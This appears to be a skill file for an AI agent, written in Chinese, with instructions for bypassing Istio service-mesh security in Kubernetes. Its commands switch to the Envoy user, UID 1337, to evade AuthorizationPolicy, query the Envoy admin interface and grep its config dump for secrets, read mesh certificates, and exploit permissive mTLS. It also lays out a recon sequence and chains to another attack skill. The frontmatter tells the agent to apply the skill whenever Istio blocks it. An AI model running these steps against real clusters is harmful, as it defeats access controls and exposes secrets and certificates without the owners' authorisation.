---
name: k8s-istio-bypass
description: "Istio Service Mesh 安全策略绕过。当目标 K8s 集群使用 Istio、请求被 AuthorizationPolicy 拒绝（403 RBAC denied）、或发现 Envoy sidecar 时使用。核心手法：UID 1337 绕过 Envoy。任何在 K8s 中遇到 Istio 策略阻拦、Service Mesh 限制、或 Envoy 相关安全控制的场景都应使用此技能"
metadata:
  tags: "k8s,kubernetes,istio,envoy,service-mesh,authorizationpolicy,bypass,策略绕过,服务网格"
  category: "cloud"
---

# Istio Service Mesh 安全策略绕过

Istio 通过 Envoy sidecar 实现流量管理和安全策略。但 Istio 的架构中有一个根本性的设计缺陷可以被利用：Envoy 以 UID 1337 运行，而 iptables 规则会排除 UID 1337 的流量以避免死循环——这意味着以该 UID 身份发出的请求完全绕过 Envoy，所有 Istio 策略不再生效。

## 核心手法: UID 1337 绕过

Istio 的 iptables 规则把 UID 1337 的出站流量排除在拦截范围之外（否则 Envoy 自身的出站流量也会被拦截形成死循环）。这个设计决定意味着：

```
正常流量:  Pod → iptables → Envoy (策略检查) → 目标
UID 1337: Pod → iptables → (跳过 Envoy) → 直接到达目标
```

### 利用步骤

```bash
# 1. 确认 istio 用户存在
grep 1337 /etc/passwd
# istio:x:1337:1337::/home/istio:/bin/sh

# 2. 切换到 istio 用户
su istio
# 或
su -s /bin/sh istio

# 3. 以 istio 身份发起请求（绕过 AuthorizationPolicy）
curl <target-service>.<namespace>.svc.cluster.local

# 4. 如果 su 不可用，尝试 nsenter 或 runuser
runuser -u istio -- curl <target-service>
```

> 参考: https://github.com/istio/istio/issues/4286

### AuthorizationPolicy DENY 绕过示例

当策略禁止特定 HTTP 方法时：
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
spec:
  action: DENY
  rules:
  - to:
    - operation:
        methods: ["POST", "GET"]
```

- ❌ 切换 HTTP Method (PATCH/PUT) — 通常返回 400
- ✅ **以 UID 1337 发请求** — 完全绕过 Envoy，策略不生效

---

## 其他 Istio 利用手法

### Envoy 管理接口

```bash
# Envoy admin interface (默认 15000)
curl localhost:15000/
curl localhost:15000/config_dump  # 完整配置（可能含 secret）
curl localhost:15000/clusters     # 上游集群信息
curl localhost:15000/listeners    # 监听器配置
curl localhost:15000/stats        # 统计信息

# Pilot debug 接口 (默认 15014)
curl localhost:15014/debug/endpointz
curl localhost:15014/debug/configz
```

### mTLS 降级

```bash
# 如果 PeerAuthentication 设为 PERMISSIVE（而非 STRICT）
# 可以发送不带 mTLS 的明文请求
curl http://<service>:<port>  # 明文 HTTP 可能被接受
```

### 利用 Sidecar 资源

Envoy sidecar 可能缓存了 mTLS 证书和集群信息，配合 `Skill(skill="k8s-sidecar-attack")` 进一步利用。

```bash
ls /etc/certs/ 2>/dev/null
ls /var/run/secrets/istio/ 2>/dev/null
cat /var/run/secrets/istio/root-cert.pem 2>/dev/null
```

---

## 侦察流程

```bash
# 1. 确认 Istio 存在
env | grep -i istio
ls /var/run/secrets/istio/ 2>/dev/null
curl -s localhost:15000/server_info 2>/dev/null | head -5

# 2. 发现目标服务
k8spider scan -subnet <service-cidr>

# 3. 直接访问（测试是否被 AuthorizationPolicy 阻止）
curl -v <target-service>
# 如果返回 403 RBAC access denied → 说明有 AuthorizationPolicy

# 4. 尝试 UID 1337 绕过
su istio -c "curl <target-service>"

# 5. 检查 Envoy 管理接口
curl localhost:15000/config_dump | grep -i secret
```

---

## 关键要点

- **UID 1337 = Istio 的"上帝模式"** — 流量不经过 Envoy，不受任何 Istio 策略控制
- Envoy admin 接口默认在 `localhost:15000`，可能泄露 secret 和集群拓扑
- `PeerAuthentication: PERMISSIVE` 允许明文通信
- Istio 的 `AuthorizationPolicy` 只在 Envoy 层生效，绕过 Envoy = 绕过所有策略
